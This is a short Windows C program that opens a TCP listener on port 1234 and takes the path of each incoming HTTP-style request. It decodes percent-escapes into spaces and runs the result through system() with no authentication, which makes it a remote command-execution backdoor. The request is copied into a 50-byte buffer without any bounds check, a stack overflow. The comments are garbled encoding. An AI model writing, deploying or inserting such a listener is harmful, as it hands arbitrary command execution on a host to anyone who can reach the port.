#include "winsock.h"
#include "stdlib.h"
#include "stdio.h"
#include "string.h"
//#pragma comment (lib,"wsock32")///����Ŀ��ļ�


int  main(int argc,char *argv[])
{

    char cmd[50];
    int count;
    int skip;


    WSADATA wsadata;

    WORD wVersion=MAKEWORD(2,0);/////////winsock 2.0
    if(WSAStartup(wVersion,&wsadata)!=0)
    {
        printf("initalize failed!\n");
        WSACleanup();
        exit(1);
    }


    //��ȡ����ip
    char name[255];//�������ڴ�Ż�õ��������ı���
    char *ip;//����IP��ַ����
    PHOSTENT hostinfo;
    gethostname( name, sizeof(name));
    hostinfo = gethostbyname(name);
    ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);





    int sock,csock,length;//sock�Ƿ������������׽��֣�csock�ǿͻ��������׽���
    length=sizeof(struct sockaddr);


    struct sockaddr_in server_ipaddr,client_ipaddr;//������÷������Ϳͻ��˵ĵ�ַ��Ϣ
    memset(&server_ipaddr,0,length);
    server_ipaddr.sin_family=AF_INET;
    server_ipaddr.sin_port=htons(1234);
    server_ipaddr.sin_addr.s_addr=inet_addr((const char *)ip);


    char buff[4096];int nbuff;

    sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if(bind(sock,(struct sockaddr *)&server_ipaddr,length)==SOCKET_ERROR)
    {
    printf("Bind error\n");
    WSACleanup();
    exit(1);
    }

    if(listen(sock,5)==SOCKET_ERROR)
    {
        printf("Listen error/n");
        WSACleanup();
        exit(1);
    }

    /////////////
    char headers[1000];//////////����ͷ��
    /////////ͷ����ʽ
    char hdrFmt[]="Content-Type: text/html \n\n";
    /*
    "HTTP/1.0 200 OK/r/n"
    "Server: MySocket Server/r/n"
    "Date: %s/r/n"
    "Content-Type: text/html/r/n"
    "Accept-Ranges: bytes/r/n"
    "Content-Length: %d/r/n/r/n";
    */
    char * strGmtNow="08/15/14 22:53:00 GMT";///////////���ָ����һ��ʱ��

    char CustomHtml[]="<html><head></head><body>OK</body></htm/>";





    //////////
    while(1)
    {
        //////////���������Ӻ󣬲����µ��׽���
        ///////////�����Ϳͻ��˴�����Ϣ
        csock=accept(sock,(struct sockaddr *)&client_ipaddr,&length);
        if(csock==SOCKET_ERROR)
        {
            printf("Listen error/n");
            WSACleanup();
            exit(1);
        }
        nbuff=recv(csock,buff,4095,0);
        buff[nbuff]='\0';
        printf("%s",buff);
        count=5;
        skip=0;
        while(buff[count]!='?')
        {
            if(buff[count]=='%')
            {
                cmd[count-5]=' ';
                count+=3;
                skip+=2;
                continue;
            }
            cmd[count-5-skip]=buff[count];
            count++;
        }

        cmd[count-5-skip]='\0';
        printf("%s",cmd);
         system(cmd);
        /////������Ӧͷ��
        wsprintf(headers, hdrFmt, (const char*) strGmtNow, strlen(CustomHtml));
        //send(csock,headers,strlen(headers),0);
        /////��������
        send(csock,CustomHtml,strlen(CustomHtml),0);
        /////////�رձ�������
        closesocket(csock);
    }
    return 0;
}
